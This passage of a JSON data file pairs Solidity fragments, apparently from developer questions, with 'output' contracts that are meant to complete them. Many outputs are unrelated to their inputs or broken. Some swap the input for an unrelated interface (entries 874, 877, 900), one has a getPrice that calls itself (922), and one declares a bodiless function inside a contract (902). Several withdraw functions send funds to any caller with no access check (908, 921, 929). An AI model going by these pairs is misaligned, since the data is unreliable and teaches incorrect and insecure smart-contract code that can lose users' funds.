        "input": "uint256 private lastTimeStamp;\nuint256 private interval;\n\nconstructor() {\n    lastTimeStamp = block.timestamp;\n    interval = 7 days;\n}\n\nfunction isTimePassed() public view returns (bool timePassed) {\n    timePassed = ((block.timestamp - lastTimeStamp) > \n interval);\n    return timePassed;\n}\n\nfunction smth() public {\n    (bool timePassed) = isTimePassed();\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Abstract {\n    uint256 private lastTimeStamp;\n    uint256 private interval;\n\n    constructor() {\n        lastTimeStamp = block.timestamp;\n        interval = 7 days;\n    }\n\n    function isTimePassed() public view returns (bool timePassed) {\n        timePassed = (\n            (block.timestamp - lastTimeStamp) > \n            interval\n        );\n        return timePassed;\n    }\n\n    modifier isAllowedTimePassed() {\n        require(isTimePassed(), \"Allowed only once per interval.\");\n        _;\n    }\n}\n\n"
    },
    "874.sol": {
        "input": "  uint256 amount = balanceOf(msg.sender);\n  transfer(newowner, amount);\n\n  function changeOwnership(address newowner) payable public {\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownership {\n  string public name;\n  address public owner;\n\n  constructor() public {\n    name = \"Ownership\";\n    owner = msg.sender;\n  }\n\n  function transferOwnership(address newowner) public {\n    require(newowner != address(0));\n    emit OwnershipTransferred(owner, newowner);\n    owner = newowner;\n  }\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n}\n\n"
    },
    "875.sol": {
        "input": "   address public  owner;\n\n  constructor()\n\n function transferOwnership(address newOwner) public onlyOwner{\n\nconstructor (string memory tokenName, string memory tokenSymbol, uint initialSupply) {\n\n  function _transfer(address _from,address _to,uint256 _value ) internal {\n    require(_to != 0x0000000000000000000000000000000000000000);\n\nfunction mintToken (address _target, uint256 _mintedAmount) public onlyOwner {\n        balanceOf[_target] += _mintedAmount;\n        totalSupply += _mintedAmount;\n        emit Transfer(address(0), owner, _mintedAmount);\n        emit Transfer(owner, _target, _mintedAmount);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\nfunction transfer(address recipient, uint256 amount) external returns (bool);\n\nfunction allowance(address owner, address spender) external view returns (uint256);\n\nfunction transferFrom(address from, address to, uint256 value) external returns (bool);\n\nfunction approve(address spender, uint256 amount) external returns (bool);\n\nevent Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n"
    },
    "877.sol": {
        "input": "modifier open(address from, address to) {\n    require(isOpen || _whiteList[from] || _whiteList[to], \"Not Open\");\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transfer(address to, uint amount) external returns (bool success, uint amount0);\n}\n\ninterface IWETH9 {\n    function deposit(uint amount) external payable;\n}\n\n"
    },
    "878.sol": {
        "input": "function getList() public view returns (ERC20[] memory){\n    return tokenList;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract TokenList {\n    ERC20[] public tokenList;\n\n    function getList() public view returns (ERC20[] memory) {\n        return tokenList;\n    }\n}\n\n"
    },
    "879.sol": {
        "input": "function exists1(uint num) public view returns (bool) {\n    for (uint i = 0; i < numbers1.length; i++) {\n        if (numbers1[i] == num) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nuint[] numbers1;\nmapping(uint => bool) public exists1; \n\nfunction push1(uint num1, uint num2, uint num3) public {\n    numbers1.push(num1);\n    numbers1.push(num2);\n    numbers1.push(num3);\n\n    exists1[num1] = true;\n    exists1[num2] = true;\n    exists1[num3] = true;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract PushERC20_2 {\n    uint[] numbers1;\n    mapping(uint => bool) public exists1; \n\n    constructor () public {\n    }\n\n    function exists1(uint num) public view returns (bool) {\n        for (uint i = 0; i < numbers1.length; i++) {\n            if (numbers1[i] == num) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    function push1(uint num1, uint num2, uint num3) public {\n        numbers1.push(num1);\n        numbers1.push(num2);\n        numbers1.push(num3);\n\n        exists1[num1] = true;\n        exists1[num2] = true;\n        exists1[num3] = true;\n    }\n}\n\n"
    },
    "880.sol": {
        "input": "pragma solidity 0.8.8;\n\ncontract SimpleStorage {\n    bool HasFavoriteNumber = true;\n    uint256 public FavoriteNumber;\n    uint256 public testVar;\n\n    function store(uint256 _FavoriteNumber) public {\n        FavoriteNumber = _FavoriteNumber;\n        testVar += 5;\n    }\n    \n    function retrieve() public view returns(uint256){\n        return FavoriteNumber;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    bool HasFavoriteNumber = true;\n    uint256 public FavoriteNumber;\n    uint256 public testVar;\n\n    function store(uint256 _FavoriteNumber) public {\n        FavoriteNumber = _FavoriteNumber;\n        testVar += 5;\n    }\n\n    function retrieve() public view returns (uint256) {   \n        return FavoriteNumber;\n    }\n}\n\n"
    },
    "882.sol": {
        "input": "function getWRequest(uint _index) public view returns(WRequest memory) {\n   return WRequestList[_index];\n}\n\n\n",
        "output": "pragma solidity ^0.4.19;\ncontract MyContract {\n    struct WRequest {\n        // define the structure of WRequest here\n    }\n    \n    WRequest[] private WRequestList;\n    \n    function getWRequest(uint _index) public view returns(WRequest memory) {\n        return WRequestList[_index];\n    }\n}\n"
    },
    "884.sol": {
        "input": "struct Campaign {\n    uint256 donations;\n}\n\ncampaign.donations += amount;\n\nstruct Campaign {\n    uint256[] donations;\n}\n\ncampaign.donations.push(amount);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Campaign {\n        uint256[] donations;\n    }\n    \n    Campaign campaign;\n    \n    function addDonation(uint256 amount) external {\n        campaign.donations.push(amount);\n    }\n}\n"
    },
    "886.sol": {
        "input": "transferFrom(from, to, tokenId)\n\nrequire(to == exists[to], \"Warning, You are selling outside of the contract\")\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC721 {\n    function transferFrom(address from, address to, uint256 tokenId) external returns (bytes);\n}\n\ncontract CandySushi_Mint_Sushi {\n    mapping(address => bool) public exists;\n\n    function set_owner(address owner) public {\n        require(msg.sender == address(this), \"Only Owner Can Set Owner\");\n        exists[owner] = true;\n    }\n\n    function set_sushi(address sushi) public {\n        require(msg.sender == address(this), \"Only Owner Can Set Sushi Contract\");\n        IERC721(sushi).transferFrom(msg.sender, address(this), 1);\n        exists[sushi] = true;\n    }\n}\n\n"
    },
    "887.sol": {
        "input": "contract FundMe {\n    constructor() payable {\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FundMe {\n    constructor() payable {\n        // can be empty and without arguments\n    }\n\n    // TODO rest of your code\n}\n\n"
    },
    "888.sol": {
        "input": "contract VANET {\nVehicle[] vehicles;\n\nstruct Vehicle{\n    string name;\n    string owner; \n    string number; \n    string license;\n}\n\nevent VehicleEvent(\n    string name,\n    string owner,\n    string number,\n    string license\n);\n\nfunction setVehicle(string memory _name, string memory _owner, string memory _number, string memory _license) public{\n    vehicles.push(Vehicle(_name, _owner, _number, _license));\n    emit VehicleEvent(_name, _owner, _number, _license);\n}\n\nfunction getVehicle(uint256 id) public view returns (string memory name, string memory owner, string memory number, string memory license) {\n    return (vehicles[id].name, vehicles[id].owner, vehicles[id].number, vehicles[id].license);\n}}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VANET {\nVehicle[] vehicles;\n\nstruct Vehicle{\n    string name;\n    string owner; \n    string number; \n    string license;\n}\n\nevent VehicleEvent(\n    string name,\n    string owner,\n    string number,\n    string license\n);\n\nfunction setVehicle(string memory _name, string memory _owner, string memory _number, string memory _license) public{\n    vehicles.push(Vehicle(_name, _owner, _number, _license));\n    emit VehicleEvent(_name, _owner, _number, _license);\n}\n\nfunction getVehicle(uint256 id) public view returns (string memory name, string memory owner, string memory number, string memory license) {\n    return (vehicles[id].name, vehicles[id].owner, vehicles[id].number, vehicles[id].license);\n}}\n\n"
    },
    "889.sol": {
        "input": "[StructObject].[Attribute];\n\nfunction getInfo(uint _infoid) external view returns (uint, address) {\n  return (infos[_infoid]._id, infos[_infoid]._add);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Response {\n    struct Infos {\n        uint _id;\n        address _add;\n    }\n    \n    mapping(uint=>Infos) public infos;\n    \n    function getInfo(uint _infoid) external view returns (uint, address) {\n         return (infos[_infoid]._id, infos[_infoid]._add);\n    }\n}\n\n"
    },
    "890.sol": {
        "input": "function setData() public {\n  IncrementalPrice[] price = [\n    IncrementalPrice(0, 1000),\n    IncrementalPrice(0.01, 2000)\n ];\n\nIncrementalPrice(0.01 ether, 2000)\n\nIncrementalPrice(0.01, 2000)\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct IncrementalPrice {\n        uint256 price;\n        uint256 quantity;\n    }\n    \n    IncrementalPrice[] public prices;\n    \n    constructor() {\n        prices.push(IncrementalPrice(0, 1000));\n        prices.push(IncrementalPrice(0.01 ether, 2000));\n    }\n    \n    function setData() public {\n        prices.push(IncrementalPrice(0.01 ether, 2000));\n    }\n}\n"
    },
    "891.sol": {
        "input": "const contract = new ethers.Contract(contractAddress, abiJson, signerInstance);\n\nawait contract.buyNumber(1, {\n    value: ethers.utils.parseEther('0.1')\n});\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IArtwork {\n    function buyNumber(\n        uint128 id,\n        bytes calldata payment\n    ) external payable;\n}\n\ncontract BuyArtwork {\n    address private artwork;\n\n    constructor(address _artwork) public {\n        artwork = _artwork;\n    }\n\n    function buyNumber(\n        uint128 id,\n        bytes calldata payment\n    )\n    external payable {\n        IArtwork(artwork).buyNumber(id, payment);\n    }\n}\n\n"
    },
    "892.sol": {
        "input": "pragma solidity\u00a0^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract MyCollection is ERC721, Ownable {\n\n    constructor() ERC721(\"MyCollection\", \"MyC\") {\n        _mint(owner(), 1);\n    }\n\n    function claim() external {\n        require(ownerOf(1) == owner(), \"Already claimed\");\n        _transfer(owner(), msg.sender, 1);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    event Approval(address indexed owner, address indexed approved, uint256 tokenId);\n    event Transfer(address indexed from, address indexed to, uint256 tokenId);\n\n    function approve(address to, uint256 tokenId) external;\n    function getApproved(uint256 tokenId) external view returns (address);\n    function setApprovalForAll(address operator, bool isApproved) external;\n}\n\n"
    },
    "893.sol": {
        "input": "token.transferFrom(address(this), address(this), 10);\n\nfunction createSubDAO (uint _poolGap, uint _DAOID, uint _rate, Dtoken _token) public returns (address daoAddress) {\n    SubDAO subDAO = new SubDAO(_poolGap, _DAOID, msg.sender, _rate, this, _token);\n    daoAddress = address(subDAO);\n\n    Dtoken(_token).transfer(daoAddress, 10);\n}}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Dtoken {\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract MyContract {\n    function createSubDAO (uint _poolGap, uint _DAOID, uint _rate, Dtoken _token) public returns (address daoAddress) {\n        SubDAO subDAO = new SubDAO(_poolGap, _DAOID, msg.sender, _rate, address(this), _token);\n        daoAddress = address(subDAO);\n\n        Dtoken(_token).transfer(daoAddress, 10);\n    }\n\n    function transferFrom(address _token, address _from, address _to, uint256 _amount) public returns (bool) {\n        Dtoken(_token).transferFrom(_from, _to, _amount);\n        return true;\n    }\n}\n\ncontract SubDAO {\n    constructor(uint _poolGap, uint _DAOID, address _sender, uint _rate, address _contractAddress, Dtoken _token) {\n        // constructor logic\n    }\n}\n"
    },
    "895.sol": {
        "input": "contract ElectionFactory {\n    address[] public deployedElections;\n    uint public electionsCount;\n    address public owner;\n\n  modifier ownerOnly(){ \n        require(msg.sender == owner); \n        _;\n    }\n    constructor(){\n        owner=msg.sender();\n    }\n    function createElection() public ownerOnly {\n        Election newElection = new Campaign();\n        deployedElections.push(address(newElection));\n        electionsCount++;\n    }\n\n    function getDeployedCampaign(uint index) public view returns (address) {\n        return deployedElections[index];\n    }\n\n    function getCampaignCounts() public view returns (uint) {\n        return campaignsCount;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ElectionFactory {\n    address[] public deployedElections;\n    uint public electionsCount;\n    address public owner;\n\n    modifier ownerOnly() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function createElection() public ownerOnly {\n        address newElection = address(new Election());\n        deployedElections.push(newElection);\n        electionsCount++;\n    }\n\n    function getDeployedElection(uint index) public view returns (address) {\n        return deployedElections[index];\n    }\n\n    function getElectionCount() public view returns (uint) {\n        return electionsCount;\n    }\n}\n\ncontract Election {\n    // Place your Election contract code here\n}\n"
    },
    "896.sol": {
        "input": "uint8 public _taxFee = 0;\nuint8 private _previousTaxFee = _taxFee;\n\nuint8 public _liquidityFee = 0;\nuint8 private _previousLiquidityFee = _liquidityFee;\n\nuint8 public _burnFee = 0;\nuint8 private _previousBurnFee = _burnFee;\n\nuint8 public _walletFee = 0;\nuint8 private _previousWalletFee = _walletFee;\n\nuint8 public _buybackFee = 0;\nuint8 private _previousBuybackFee = _buybackFee;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ILiquidityPool {\n     function liquidity() external view returns (uint);\n}\n\n"
    },
    "897.sol": {
        "input": "(bool sent,) = _charity.call{value: msg.value}(\"\");\nrequire(sent, \"DONATION_FAILED\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DonationContract {\n    address payable private _charity;\n\n    constructor(address payable charity) {\n        _charity = charity;\n    }\n\n    function donate() external payable {\n        (bool sent,) = _charity.call{value: msg.value}(\"\");\n        require(sent, \"DONATION_FAILED\");\n    }\n}\n\n"
    },
    "898.sol": {
        "input": "constructor () {\n    AuthAccounts[msg.sender] = true;\n    AuthAccounts[_addr_1] = true;\n    AuthAccounts[_addr_2] = true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => bool) public AuthAccounts;\n    \n    constructor () {\n        AuthAccounts[msg.sender] = true;\n        address _addr_1 = address(0x123); // replace with desired address\n        AuthAccounts[_addr_1] = true;\n        address _addr_2 = address(0x456); // replace with desired address\n        AuthAccounts[_addr_2] = true;\n    }\n}\n"
    },
    "899.sol": {
        "input": "function isBitSet(uint256 b, uint256 pos) public pure returns (bool) {\n        return ((b >> pos) & 1) == 1;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BitSet {\n\n    function isBitSet(uint256 b, uint256 pos) public pure returns (bool) {\n        return ((b >> pos) & 1) == 1;\n    }\n\n}\n\n"
    },
    "900.sol": {
        "input": "    function seeSlot() external view returns(uint) {\n        assembly {\n            let sl:= sload(age.slot)   \n            mstore(0x00, sl)           \n            return (0x00, 0x20)        \n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Age {\n    address private owner;\n    constructor(address _owner) {\n        owner = _owner;\n    }\n}\n\n"
    },
    "901.sol": {
        "input": "contract LotteryContract {\n  function buyTicket() public {\n  }\n}\n\ncontract CasinoContract {\n  function placeBet() public {\n    LotteryContract.buyTicket()\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface LotteryContract {\n  function buyTicket() public;\n}\n\ninterface CasinoContract {\n  function placeBet() public;\n}\n\n"
    },
    "902.sol": {
        "input": "function getCount() external view returns (uint256) {\n    InterfaceA b = InterfaceA(addressA);\n    return b.count();\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface InterfaceB {\n    \n    function count() external view returns (uint256);\n}\n\ncontract InterfaceA {\n    \n    \n    function count() external view returns (uint256);\n}\n\ncontract InterfaceB_ {\n    address public addressA;\n    \n    InterfaceB publicInterfaceB;\n    \n    \n    \n    constructor(address _address) {\n        addressA = _address;\n    }\n    \n    function getCount() external view returns (uint256) {\n        InterfaceB b = InterfaceB(addressA);\n        return b.count();\n    }\n}\n\n"
    },
    "903.sol": {
        "input": "constructor() {\n    reward.timestamp = block.timestamp;\n    reward.recipients.push(Recipient(msg.sender, 1));\n}\n\nconstructor() {\n    Recipient[] memory recipients = new Recipient[](3);\n    recipients[0] = Recipient(msg.sender, 1);\n    recipients[1] = Recipient(address1, 1);\n    recipients[2] = Recipient(address2, 1);\n    reward.timestamp = block.timestamp;\n\n    for (uint256 i = 0; i < recipients.length; i++) {\n        reward.recipients.push(recipients[i]);\n    }\n}\n\nconstructor() {\n    Recipient[] storage recipients = reward.recipients; \n    recipients[0] = Recipient(msg.sender, 1);\n    reward.recipients = recipients;\n    reward.timestamp = block.timestamp;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Recipient {\n        address recipientAddress;\n        uint256 amount;\n    }\n    \n    struct Reward {\n        uint256 timestamp;\n        Recipient[] recipients;\n    }\n    \n    Reward reward;\n    \n    constructor() {\n        reward.timestamp = block.timestamp;\n        reward.recipients.push(Recipient(msg.sender, 1));\n    }\n}\n"
    },
    "906.sol": {
        "input": "constructor() payable {\n    owner = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyERC20Token {\n    \n    address public owner;\n    \n    \n    \n    constructor() payable {\n\n        owner = msg.sender;\n\n        }\n\n    function () external payable {\n\n    }\n}\n\n"
    },
    "907.sol": {
        "input": "\n IERC20(WETH).approve(routerA, amount);\n\n        IUniswapV2Router02(routerA).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            amount, \n            0, \n            path2, \n            cttAddress, \n            block.timestamp + 1200\n        );      \n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPancakeSwapRouter {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amount0,\n        uint256 amount1,\n        address to,\n        uint256 deadline\n    ) external returns (uint256 amount);\n}\n\ninterface IPancakeRouter {\n    function swapTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amount0,\n        uint256 amount1,\n        uint256 path0,\n        address from\n    ) external returns (uint256 amount);\n}\n\n"
    },
    "908.sol": {
        "input": "function withdraw(uint _amount) external {\n    payable(msg.sender).transfer(_amount);    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Withdraw {\n    function withdraw(uint _amount) external payable {\n    payable(msg.sender).transfer(_amount);    \n    }\n}\n\n"
    },
    "909.sol": {
        "input": "function remove(uint[] storage _arr, uint _removedIndex) public returns(uint[] memory){\n    require(_arr.length > 0, \"No element in Array.\");\n    _arr[_removedIndex] = _arr[_arr.length-1];\n    _arr.pop();\n    return _arr;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Lib {\n\nfunction remove(uint[] storage _arr, uint _removedIndex) public returns(uint[] memory){\n    require(_arr.length > 0, \"No element in Array.\");\n    _arr[_removedIndex] = _arr[_arr.length-1];\n    _arr.pop();\n    return _arr;\n}\n}\n\n"
    },
    "910.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract Structure {\n    struct BaseStruct {\n        uint256 a;\n        uint256 b;\n    }\n\n    struct DerivedStruct {\n        BaseStruct base;\n        uint256 c;\n        uint256 d;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ncontract Structure {\n    struct BaseStruct {\n        uint256 a;\n        uint256 b;\n    }\n\n    struct DerivedStruct {\n        BaseStruct base;\n        uint256 c;\n        uint256 d;\n    }\n}\n\n"
    },
    "911.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"https:\n\ncontract Auction is ERC721 {\n    \n    constructor() ERC721(\"CollectionName\", \"Symbol\") {}\n    \n    function createAuction() public {\n        uint256 newTokenId = 1;\n\n        _mint(msg.sender, newTokenId);\n        _approve(address(this), newTokenId);\n    }\n    \n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n    \n    function approve(address to, uint256 tokenId) external;\n\n    function getApproved(uint256 tokenId) external view returns (address);\n\n    function setApprovalForAll(address operator, bool approved) external;\n\n}\n\n"
    },
    "912.sol": {
        "input": "    address public owner;\n    address payable public receiverContract;\n\n    constructor(address payable _receiverContract) payable{\n       receiverContract = _receiverContract;\n        owner = msg.sender;\n    }\n\n    function sendEther() public payable {\n        require(address(this).balance > msg.value, \"Not enough funds\" );\n        receiverContract.transfer(msg.value);\n    }\n\n    receive() external payable {\n  }\n} ```\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Test {\n    address public owner;\n    address payable public receiverContract;\n\n     constructor(address payable _receiverContract) payable{\n        receiverContract = _receiverContract;\n        owner = msg.sender;\n    }\n\n    function sendEther() public payable {\n        require(address(this).balance > msg.value, \"Not enough funds\" );\n        receiverContract.transfer(msg.value);\n    }\n\n   receive() external payable {\n    }\n}\n\n"
    },
    "914.sol": {
        "input": "function safeMint() external {\n    require(failedCondition);\n    _mint(msg.sender, tokenId);\n}\n\nfunction safeMint() external {\n    if (failedCondition) {\n        _mint(msg.sender, tokenId);\n    }\n}\n\nconst tx = await myContract.safeMint();\nconst txReceipt = await transaction.wait();\n\nif (txReceipt.status) {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    \n    function mint(address account) external;\n}\n\ninterface IMinter {\n    \n    function mint(address account) external payable;\n}\n\n"
    },
    "915.sol": {
        "input": "pragma solidity >=0.4.22 <0.9.0;\nstruct list{\n    string Pan;\n    uint age;\n    address Address;\n    bool Enrolled;\n    bool voted;\n} \nstruct candidate_list{\n    string Name;\n    address Address;\n    uint id;\n    bool listed;\n}\naddress constant election_officer = address(0);\nstring constant decimal = \"0\";\nuint constant totalSupply = 1000e18;\naddress constant founder = address(0);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Election {\n    struct Voter {\n        string Pan;\n        uint age;\n        address voterAddress;\n        bool enrolled;\n        bool voted;\n    } \n    \n    struct Candidate {\n        string Name;\n        address candidateAddress;\n        uint id;\n        bool listed;\n    }\n    \n    address constant election_officer = address(0);\n    string constant decimal = \"0\";\n    uint constant totalSupply = 1000e18;\n    address constant founder = address(0);\n    \n    mapping(address => Voter) public voters;\n    mapping(uint => Candidate) public candidates;\n    uint public numCandidates;\n    mapping(uint => uint) public voteCount;\n    \n    constructor() {\n        numCandidates = 0;\n    }\n    \n    function addCandidate(string memory _name, address _candidateAddress) public {\n        require(msg.sender == election_officer, \"Only election officer can add candidates\");\n        candidates[numCandidates] = Candidate(_name, _candidateAddress, numCandidates, true);\n        numCandidates++;\n    }\n    \n    function enrollVoter(string memory _pan, uint _age, address _voterAddress) public {\n        require(msg.sender == election_officer, \"Only election officer can enroll voters\");\n        voters[_voterAddress] = Voter(_pan, _age, _voterAddress, true, false);\n    }\n    \n    function vote(uint _candidateId) public {\n        require(voters[msg.sender].enrolled, \"Only enrolled voters can vote\");\n        require(!voters[msg.sender].voted, \"Voter has already voted\");\n        require(candidates[_candidateId].listed, \"Invalid candidate\");\n        \n        voters[msg.sender].voted = true;\n        voteCount[_candidateId]++;\n    }\n}\n"
    },
    "916.sol": {
        "input": "int public hp = 100;\n\nint internal attack = 20;\nint private attackMod = 2;\n\nfunction test() public view returns(int){\n    return attack * attackMod;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract AttackModifier {\n    int public hp = 100;\n\n    int internal attack = 20;\n    int private attackMod = 2;\n\n    function test() public view returns(int) {\n        return attack * attackMod;\n    }\n\n    function modifyAttack(int amount) private {\n        attackMod += amount;\n    }\n}\n\n"
    },
    "918.sol": {
        "input": "library Structs {\n    struct AnyName {\n        uint256 id;\n    }\n}\n\ncontract ContractA {\n    Structs.AnyName go;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary Structs {\n    struct AnyName {\n        uint256 id;\n    }\n}\n\ncontract ContractA {\n    Structs.AnyName go;\n}\n\n"
    },
    "920.sol": {
        "input": "    import \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  abstract contract UUPSUpgradeable {\n\n    function _upgradeTo(address target) internal virtual;\n  }\n\n"
    },
    "921.sol": {
        "input": "function sendViaCall(address payable _to ) external payable  {\n    (bool sent, ) = _to.call{value: address(this).balance}(\"\");\n    require(sent, \"Failed to send Ether\");\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PayableToken {\n\n    function sendViaCall(address payable _to ) external payable  {\n        (bool sent, ) = _to.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n\n}\n\n"
    },
    "922.sol": {
        "input": "   function getEntranceFee() public view returns (uint256) {\n        uint256 minimumUSD = 50 * (10**18);\n        uint256 price = getPrice();\n        uint256 pricision = 1 * (10**18);\n        return ((minimumUSD * pricision) / price);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IUniswapV2Pair {\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function price() external view returns (uint256);\n    function getPrice(uint256) external view returns (uint256);\n}\n\ncontract UniswapV2Factory {\n    function getPrice() public view returns (uint256) {\n        uint256 minimumUSD = 50 * (10**18);\n        uint256 price = getPrice();\n        uint256 pricision = 1 * (10**18);\n        return ((minimumUSD * pricision) / price);\n    }\n}\n\n"
    },
    "923.sol": {
        "input": "\n    \n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20Interface {\n\n    function transfer(address recipient, uint256 amount) external;\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract Owned {\n\n    address private owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function transferOwnership(address newOwner) external onlyOwner {\n        owner = newOwner;\n    }\n\n}\n\n"
    },
    "924.sol": {
        "input": "function getPrice() public view returns (uint256) {\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        return uint256(answer * 10000000000);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPriceFeed {\n    function latestRoundData() external view returns (uint256, int256, uint256, uint256, uint256);\n}\n\ncontract MyPriceFeed {\n    IPriceFeed public priceFeed;\n    \n    function getPrice() public view returns (uint256) {\n        (, int256 answer, , , ) = priceFeed.latestRoundData();\n        return uint256(answer * 10000000000);\n    }\n    \n    constructor(address priceFeedAddress) {\n        priceFeed = IPriceFeed(priceFeedAddress);\n    }\n}\n\n"
    },
    "925.sol": {
        "input": " uniswapV2Router.addLiquidityETH{value: ethAmount}(\n     address(this),\n     tokenAmount,\n     0, \n     0, \n\nuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, \n        path,\n        address(this),\n        block.timestamp\n    );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface UniswapV2Router {\n  function addLiquidityETH(\n    address token,\n    uint liquidity,\n    uint ethAmount\n  ) external returns (uint amountToken, uint amountETH);\n\n  function swapETHForExactTokens(\n    uint amountInWei,\n    uint amountTokenMin,\n    uint amountTokenMax,\n    address from,\n    address to,\n    uint deadline\n  ) external returns (uint amountToken, uint amountEther);\n\n  function swapExactTokensForETH(\n    uint amountTokenIn,\n    uint maxPurchase\n  ) external returns (uint amountEther);\n}\n\n"
    },
    "926.sol": {
        "input": "constructor(){\n  manager = msg.sender;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Manager {\n  address private manager;\n  \n  constructor() {\n    manager = msg.sender;    \n  }\n  \n  modifier onlyManager() {\n    require(msg.sender == manager);\n    _;\n  }\n}\n\n"
    },
    "927.sol": {
        "input": "contract Target {\n  uint256 public lastCalledAtBlockNumber;\n\n  function foo() external {\n    lastCalledAtBlockNumber = block.number;\n  }\n}\n\nbytes32 blockHash = blockhash(block.number);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Target {\n  uint256 public lastCalledAtBlockNumber;\n\n  function foo() external {\n    lastCalledAtBlockNumber = block.number;\n  }\n}\n\n"
    },
    "928.sol": {
        "input": "contractInstance.testFunction(<any function args>, { value: ethers.utils.parseUnits(\"1\", \"ether\") });\n\nfunction testFunction() public payable {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ITester {\n    function testFunction(uint256) external payable;\n}\n\n"
    },
    "929.sol": {
        "input": "pragma solidity >=0.7.0<0.9.0;\n\ncontract Withdraw {\n    constructor() payable {}\n\n    function withdrawByTransfer(uint256 amount) public payable {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function withdrawBySend(uint256 amount) public payable {\n        bool success = payable(msg.sender).send(amount);\n        require(success, \"Failed to send Ether\");\n    }\n\n    function withdrawByCall(uint256 amount) public returns(bytes memory) {\n        (bool success, bytes memory result) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \"Failed to withdraw Ether\");\n\n        return result;\n    }\n}\n\n\n",
